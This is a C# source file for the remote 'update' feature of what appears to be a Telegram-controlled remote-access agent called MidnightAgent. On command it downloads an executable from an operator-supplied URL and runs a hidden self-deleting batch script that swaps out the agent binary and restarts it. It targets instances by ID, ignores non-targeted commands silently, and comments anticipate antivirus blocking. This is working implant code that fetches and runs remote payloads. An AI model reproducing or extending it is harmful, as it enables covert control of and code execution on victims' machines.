using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using MidnightAgent.Core;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    public class UpdateFeature : IFeature
    {
        public string Command => "update";
        public string Description => "Update agent via URL";
        public string Usage => "/update <url> OR /update <id> <url>";

        // IsWaitingForUpdate is REMOVED (No longer waiting for file upload)
        // ProcessFileUpdate is REMOVED

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                // Case 1: Broadcase/Selected Target -> /update <url>
                // Case 2: Specific ID -> /update <id> <url>

                string url = "";
                
                if (args.Length == 1)
                {
                    // Target must be selected via /job or broadcast
                    if (!AgentState.IsActiveTarget) 
                        return FeatureResult.Ok(""); // Silent ignore if not target

                    url = args[0];
                }
                else if (args.Length >= 2)
                {
                    string targetId = args[0];
                    if (targetId != AgentState.InstanceId)
                    {
                        // Ignore if ID doesn't match
                         return FeatureResult.Ok(""); 
                    }
                    url = args[1];
                }
                else
                {
                    return FeatureResult.Fail("Usage: /update <url> OR /update <id> <url>");
                }

                return await PerformUpdate(url);
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Update Failed: {ex.Message}");
            }
        }

        public async Task<FeatureResult> PerformUpdate(string url)
        {
            try
            {
                if (!Uri.IsWellFormedUriString(url, UriKind.Absolute))
                {
                    return FeatureResult.Fail("Invalid URL format.");
                }

                Logger.Log($"Downloading update: {url}");
                
                // Download to Temp
                string tempFile = Path.Combine(Path.GetTempPath(), $"update_{DateTime.Now.Ticks}.exe");
                using (var client = new WebClient())
                {
                    await client.DownloadFileTaskAsync(new Uri(url), tempFile);
                }

                // Apply Update
                return ApplyUpdate(File.ReadAllBytes(tempFile));
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Update Failed: {ex.Message}");
            }
        }

        private FeatureResult ApplyUpdate(byte[] fileData)
        {
            try
            {
                string tempFolder = Path.Combine(Path.GetTempPath(), "MidnightUpdate");
                if (!Directory.Exists(tempFolder)) Directory.CreateDirectory(tempFolder);

                string tempPath = Path.Combine(tempFolder, "update_new.exe");
                File.WriteAllBytes(tempPath, fileData);

                string currentExe = Config.InstallPath ?? Process.GetCurrentProcess().MainModule.FileName;
                string updaterPath = Path.Combine(tempFolder, "updater.bat");
                
                string updaterScript = $@"@echo off
timeout /t 5 /nobreak > nul

REM 1. Try to backup existing agent (Move is safer than Del)
if exist ""{currentExe}"" (
    move /y ""{currentExe}"" ""{currentExe}.bak"" > nul
)

REM 2. Try to place new agent
copy /y ""{tempPath}"" ""{currentExe}"" > nul

REM 3. Verify success
if exist ""{currentExe}"" (
    REM Success! Start new agent
    start """" ""{currentExe}""
    REM Cleanup backup later (or leave it as fallback)
    del /f /q ""{currentExe}.bak"" > nul
) else (
    REM FAILED! (AV blocked copy?). RESTORE BACKUP IMMEDIATELY!
    move /y ""{currentExe}.bak"" ""{currentExe}"" > nul
    start """" ""{currentExe}""
)

REM Cleanup temp
del /f /q ""{tempPath}"" > nul
del /f /q ""%~f0"" > nul
";
                File.WriteAllText(updaterPath, updaterScript);

                // Run updater
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c \"{updaterPath}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });

                // Suicide to allow file operations
                Environment.Exit(0);
                return FeatureResult.Ok("🔄 Update initiating... (Agent restarting)");
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Apply failed: {ex.Message}");
            }
        }
        
        // Legacy shim for compilation safety (though we removed calls in CommandRouter)
         public Task<FeatureResult> ProcessFileUpdate(TelegramService telegram, string fileId, string fileName)
         {
             return Task.FromResult(FeatureResult.Fail("Feature deprecated. Use URL update."));
         }
    }
}
